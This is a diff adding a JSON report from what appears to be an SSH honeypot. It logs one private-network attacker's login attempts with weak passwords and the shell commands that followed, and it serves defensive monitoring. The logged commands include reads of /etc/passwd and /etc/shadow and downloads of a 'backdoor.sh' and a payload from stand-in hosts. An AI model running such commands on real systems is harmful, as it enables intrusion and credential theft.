@@ -1,0 +1,224 @@
+{
+  "generated_at": "2026-03-05T04:09:44.275120",
+  "summary": {
+    "total_unique_attackers": 1,
+    "total_login_attempts": 10,
+    "total_commands_executed": 22,
+    "total_sessions": 9,
+    "top_usernames": [
+      [
+        "root",
+        7
+      ],
+      [
+        "admin",
+        3
+      ]
+    ],
+    "top_passwords": [
+      [
+        "password",
+        2
+      ],
+      [
+        "admin123",
+        2
+      ],
+      [
+        "h3av3n",
+        1
+      ],
+      [
+        "12345",
+        1
+      ],
+      [
+        "123456",
+        1
+      ],
+      [
+        "123456789",
+        1
+      ],
+      [
+        "\u001b[A\u001b[Bpassword",
+        1
+      ],
+      [
+        "passsword",
+        1
+      ]
+    ]
+  },
+  "attackers": {
+    "192.168.64.6": {
+      "first_seen": "2026-03-04T22:09:30.195958Z",
+      "last_seen": "2026-03-04T22:22:33.200245Z",
+      "login_attempts": [
+        {
+          "username": "root",
+          "password": "h3av3n",
+          "success": true,
+          "timestamp": "2026-03-04T22:10:02.576824Z"
+        },
+        {
+          "username": "root",
+          "password": "12345",
+          "success": true,
+          "timestamp": "2026-03-04T22:17:48.746125Z"
+        },
+        {
+          "username": "root",
+          "password": "123456",
+          "success": false,
+          "timestamp": "2026-03-04T22:17:48.747074Z"
+        },
+        {
+          "username": "root",
+          "password": "123456789",
+          "success": true,
+          "timestamp": "2026-03-04T22:17:48.747650Z"
+        },
+        {
+          "username": "root",
+          "password": "password",
+          "success": true,
+          "timestamp": "2026-03-04T22:17:48.748373Z"
+        },
+        {
+          "username": "admin",
+          "password": "admin123",
+          "success": false,
+          "timestamp": "2026-03-04T22:19:19.517284Z"
+        },
+        {
+          "username": "admin",
+          "password": "admin123",
+          "success": false,
+          "timestamp": "2026-03-04T22:19:32.499259Z"
+        },
+        {
+          "username": "admin",
+          "password": "\u001b[A\u001b[Bpassword",
+          "success": false,
+          "timestamp": "2026-03-04T22:20:11.886606Z"
+        },
+        {
+          "username": "root",
+          "password": "passsword",
+          "success": true,
+          "timestamp": "2026-03-04T22:20:37.491311Z"
+        },
+        {
+          "username": "root",
+          "password": "password",
+          "success": true,
+          "timestamp": "2026-03-04T22:21:56.906968Z"
+        }
+      ],
+      "commands": [
+        {
+          "input": "whoami",
+          "timestamp": "2026-03-04T22:10:25.802604Z"
+        },
+        {
+          "input": "ls",
+          "timestamp": "2026-03-04T22:10:28.191309Z"
+        },
+        {
+          "input": "cat /etc/passwd",
+          "timestamp": "2026-03-04T22:10:36.294153Z"
+        },
+        {
+          "input": "wget http://evil-malware-site.com/backdoor.sh",
+          "timestamp": "2026-03-04T22:12:08.705076Z"
+        },
+        {
+          "input": "uname -a",
+          "timestamp": "2026-03-04T22:12:36.618452Z"
+        },
+        {
+          "input": "ifconfig",
+          "timestamp": "2026-03-04T22:12:42.034882Z"
+        },
+        {
+          "input": "cat /etc/shadow",
+          "timestamp": "2026-03-04T22:12:48.865936Z"
+        },
+        {
+          "input": "exit",
+          "timestamp": "2026-03-04T22:13:52.625078Z"
+        },
+        {
+          "input": "uname -a",
+          "timestamp": "2026-03-04T22:20:48.315749Z"
+        },
+        {
+          "input": "id",
+          "timestamp": "2026-03-04T22:20:50.930381Z"
+        },
+        {
+          "input": "cat /etc/passwd",
+          "timestamp": "2026-03-04T22:21:00.228646Z"
+        },
+        {
+          "input": "curl http://botnet-controller.com/payload",
+          "timestamp": "2026-03-04T22:21:14.563309Z"
+        },
+        {
+          "input": "crontab -l",
+          "timestamp": "2026-03-04T22:21:30.750616Z"
+        },
+        {
+          "input": "history",
+          "timestamp": "2026-03-04T22:21:37.353004Z"
+        },
+        {
+          "input": "exit",
+          "timestamp": "2026-03-04T22:21:40.741749Z"
+        },
+        {
+          "input": "whoami",
+          "timestamp": "2026-03-04T22:22:02.753593Z"
+        },
+        {
+          "input": "ls -la",
+          "timestamp": "2026-03-04T22:22:06.336948Z"
+        },
+        {
+          "input": "ls -la /tmp",
+          "timestamp": "2026-03-04T22:22:12.680622Z"
+        },
+        {
+          "input": "cat /etc/shadow",
+          "timestamp": "2026-03-04T22:22:24.778831Z"
+        },
+        {
+          "input": "w",
+          "timestamp": "2026-03-04T22:22:25.927264Z"
+        },
+        {
+          "input": "netstat -an",
+          "timestamp": "2026-03-04T22:22:32.035325Z"
+        },
+        {
+          "input": "exit",
+          "timestamp": "2026-03-04T22:22:33.189560Z"
+        }
+      ],
+      "sessions": 9,
+      "downloaded_files": [],
+      "client_versions": [
+        "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14",
+        "SSH-2.0-libssh_0.10.6"
+      ],
+      "threat_intel": {
+        "abuse_score": 0,
+        "country": null,
+        "isp": null,
+        "total_reports": 0,
+        "usage_type": "Reserved"
+      }
+    }
+  }
+}
